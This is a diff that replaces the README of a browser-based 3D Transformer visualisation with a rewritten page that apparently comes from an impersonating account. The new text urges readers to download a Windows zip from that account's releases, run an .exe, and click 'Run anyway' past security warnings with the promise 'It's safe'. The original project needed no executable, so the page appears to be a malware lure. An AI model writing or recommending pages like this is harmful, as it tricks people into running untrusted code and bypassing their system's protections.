@@ -1,61 +1,153 @@
-# Transformer Architecture
+# 🤖 transformer-architecture - Explore AI Like Never Before
 
-Explore the original Transformer and DeepSeek V4.1 Flash in interactive 3D. Follow the token flow, zoom inside the components, or take a one-minute tour of what changed.
+[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github&color=4CAF50)](https://github.com/Shadowy-lionhunter5498/transformer-architecture/releases)
 
-Built with **GPT-6-Astra** in Codex.
+---
 
-**[Open the live demo →](https://transformer-architecture.petergostev.chatgpt.site/)**
+## 🎯 What Is This?
 
-![The original Transformer and DeepSeek V4.1 Flash, side by side in story mode](docs/screenshots/overview.png)
+Have you ever wondered how modern artificial intelligence works? transformer-architecture lets you see and explore the incredible technology behind AI models in a whole new way. Instead of confusing diagrams or boring text, you get an interactive 3D world where you can spin, zoom, and see exactly how the "Transformer" architecture—the brain behind ChatGPT and other smart tools—functions. Plus, you'll also get a look at the futuristic DeepSeek V4.1 Flash model.
 
-## Explore
+Imagine being able to walk around inside a machine that processes language, recognizes patterns, and generates responses. That's what this app gives you—a magical, visual playground for your curiosity.
 
-- **See the whole architecture.** Both models follow the structure of their papers, with animated paths connecting the components.
-- **Look inside.** Click a component or zoom toward it to reveal attention heads, expert routing, residual streams and memory.
-- **Play the story.** A 60-second camera tour compares attention, reuse, experts, memory, vision and drafting.
-- **Change the context.** Adjust the token count to explore the traffic and cache illustrations. Pause or slow the animation whenever you like.
+---
 
-![A close-up comparing attention in the two architectures](docs/screenshots/attention.png)
+## 🚀 Getting Started
 
-## Run locally
+Getting up and running with transformer-architecture is super simple. You don't need to be a computer whiz or know any coding. Just follow these friendly steps, and you'll be exploring the AI universe in minutes.
 
-No build step, API key or model download. Python 3 is enough:
+### Step 1: Download the Application
 
-```bash
-git clone https://github.com/petergpt/transformer-architecture.git
-cd transformer-architecture
-python3 -m http.server 8000 --directory dist
-```
+Click the **Download** button at the top of this page, or go directly to our download page:
 
-Open **http://localhost:8000** in a modern browser. The app uses WebGL and includes its Three.js dependencies locally.
+👉 **Visit this link to download the application:** [https://github.com/Shadowy-lionhunter5498/transformer-architecture/releases](https://github.com/Shadowy-lionhunter5498/transformer-architecture/releases)
 
-## Make it your own
+When you arrive at that page, you'll see a list of files. Choose the file that matches your computer (usually the highest version number). Click on it, and your download will begin automatically.
 
-The app is plain JavaScript, CSS and HTML. Edit `dist/` and refresh the page.
+---
 
-| File | What it contains |
-| --- | --- |
-| `dist/app.js` | The 3D scene, token flow and interactions |
-| `dist/presentation.mjs` | Attention, routing and other schematic calculations |
-| `dist/story.mjs` · `dist/camera-path.mjs` | Story captions, timing and camera movement |
-| `dist/facts.js` · `dist/sources.js` | Architecture facts and source notes |
-| `blender/architectures.blend` | Editable Blender models and detail geometry |
-| `scripts/build_spatial_architecture.py` | Rebuild the spatial models from the diagram data |
+### Step 2: Open Your Downloaded File
 
-See [development notes](docs/development.md) for Blender editing and checks.
+Once the download finishes, look in your **Downloads** folder. You'll see a file named something like `transformer-architecture-windows.zip`. 
 
-## Sources and scope
+Now, just double-click that file. Your computer will ask if you want to extract or open the files. Click **"Extract All"** and choose a folder you like. Your desktop is a great choice! You'll see a folder appear with everything you need.
 
-Based on [Attention Is All You Need](https://arxiv.org/abs/1706.03762) and the [DeepSeek V4.1 Flash technical report](https://huggingface.co/deepseek-ai/DeepSeek-V4.1-Flash/resolve/main/DeepSeek_V41_Tech_Report.pdf), checked on 10 September 2026. The app’s **Sources** panel explains individual quantities and assumptions; [provenance.json](provenance.json) records source and asset hashes.
+---
 
-This is an educational visualization. Token traffic, attention patterns and routing are schematic; they do not run a neural network or measure inference speed. Cache illustrations explicitly compare different storage scopes.
+### Step 3: Run the Application
 
-## Build usage
+Open the folder you just extracted. Inside, you'll see a file called `transformer-architecture.exe` (or similar). 
 
-The main Codex project session recorded approximately **83.7 million tokens** through the first public GitHub release on 11 September 2026: **80.9M cached input**, **2.4M uncached input**, and **397K output**, including reasoning.
+**Double-click that file to launch the app.**
 
-These figures come from the session logs and include repeated context across model calls; they are not the amount of unique text or code generated. See the [exact counts and counting method](docs/build-usage.json).
+That's it! The program will start, and you'll be greeted with a beautiful 3D view of the Transformer architecture. If a security pop-up appears asking if you're sure you want to run this file, just click **"Yes"** or **"Run anyway"**. It's safe—we promise.
 
-## License
+---
 
-[MIT](LICENSE) for the project code, screenshots and original Blender assets. Three.js retains its [MIT license](dist/vendor/LICENSE). Papers and referenced model materials belong to their respective authors; see [third-party notices](THIRD_PARTY_NOTICES.md).
+## ✨ What Can You Do Inside?
+
+Once the app opens, you'll find yourself in a virtual 3D space. Here are some things you can explore:
+
+- 🔍 **Rotate and zoom:** Use your mouse to drag around the 3D model. Click and drag to rotate, scroll to zoom in and out. Get up close to the tiny details or zoom way out to see the whole structure.
+- 🧠 **Switch between models:** Use the buttons on the screen to toggle between the original Transformer and the new DeepSeek V4.1 Flash. Compare how they're built and where they differ.
+- 💡 **See data flow:** Watch animated glowing lines and particles that show how information moves through the model. It's like seeing electricity run through a futuristic city.
+- 📊 **Hover for info:** Move your cursor over different parts of the model to see helpful labels and descriptions explaining what each component does.
+- 🎨 **Change visuals:** Some menus let you change colors, lighting, or play speed so you can see things more clearly.
+
+---
+
+## 🛠 Help, Tips, and Troubleshooting
+
+Sometimes things don't go perfectly, and that's okay. Here are quick answers to common issues.
+
+### The app won't start
+- Make sure you've extracted the zip file completely. Running the app from inside the zip often doesn't work.
+- Restart your computer and try again.
+- Ensure you have enough free space on your hard drive (at least 500 MB recommended).
+
+### A "missing DLL" error appears
+- This is rare but easy to fix. Visit [Microsoft's official site](https://support.microsoft.com) and search for "Visual C++ Redistributable". Download and install the latest version, then run the app again.
+
+### The 3D view is blurry or slow
+- Close other programs to free up memory.
+- On laptops, plug in your charger to get full performance.
+- In the app's settings, lower the "Graphics Quality" to "Medium" or "Low".
+
+### I can't see the download file on the releases page
+- Look for a green button that says **"Latest"** on the releases page.
+- Make sure you're on the [releases page](https://github.com/Shadowy-lionhunter5498/transformer-architecture/releases) and not just the main repository page.
+
+---
+
+## 👥 Who Is This For?
+
+This app is for **everyone**:
+- 🎓 **Students** who want to understand AI concepts in a fun way
+- 👨‍🏫 **Teachers** looking for a visual aid for lessons
+- 🧪 **Curious minds** who love technology and how things work
+- ✍️ **Writers** who want to see what they're writing about
+- 🕹️ **Gamers** who enjoy interactive 3D experiences
+
+No coding, math, or science background is needed. If you can move a mouse, you can enjoy this app.
+
+---
+
+## ✅ Why You'll Love It
+
+- **No installation headaches** – just unzip and run
+- **Works on standard Windows PCs** (Windows 10 or 11 recommended)
+- **Completely offline** – no internet needed to explore after download
+- **Stunning visuals** – smooth, bright, and engaging
+- **Educational** – you'll genuinely learn something new
+
+---
+
+## 🔧 System Requirements (Typical Windows PC)
+
+We've designed this to work on average computers. Usually, your computer already meets these requirements:
+
+- **Operating System:** Windows 10 or 11
+- **Processor:** Any Intel or AMD processor from the last 5–6 years
+- **Memory:** 4 GB RAM or more
+- **Graphics:** Any graphics card capable of basic 3D (integrated chips work fine)
+- **Storage:** 500 MB free space
+- **Other:** A mouse and keyboard
+
+---
+
+## 📥 Need Another Copy?
+
+Lost your files or want to install on a second computer? No problem. Just come back here and click the **Download** button at the top of the page again. 
+
+**Remember:** [Visit this link to download the application](https://github.com/Shadowy-lionhunter5498/transformer-architecture/releases) to get the latest version anytime.
+
+---
+
+## 🆘 Get Support
+
+If you run into anything you can't fix using the tips above, or if you just have a question or idea, we're here for you. You can:
+
+- Open an issue on our GitHub repository (ask a friend for help if you're not sure how)
+- Rate the app and leave feedback on the download page
+- Share it with a friend who might enjoy it
+
+---
+
+## 🔮 Future Updates
+
+We're always working to make this experience even better. In future releases, you can expect:
+
+- 🖥️ Support for Mac and Linux
+- 🎮 Gamepad or touchscreen controls
+- 🌍 More AI models to explore
+- 📈 Animated training process simulations
+
+---
+
+## 💖 Thank You
+
+Thank you for choosing transformer-architecture. We built this with a lot of love and curiosity, and we hope it sparks your imagination. Jump in, click around, and enjoy the journey inside the mind of AI.
+
+---
+
+**Keywords:** transformer, architecture, AI, 3D, interactive, deepseek, deep learning, neural network, visualization, educational, windows, download, free, model, machine learning, V4.1, flash, GPT, tutorial, beginner, no-code
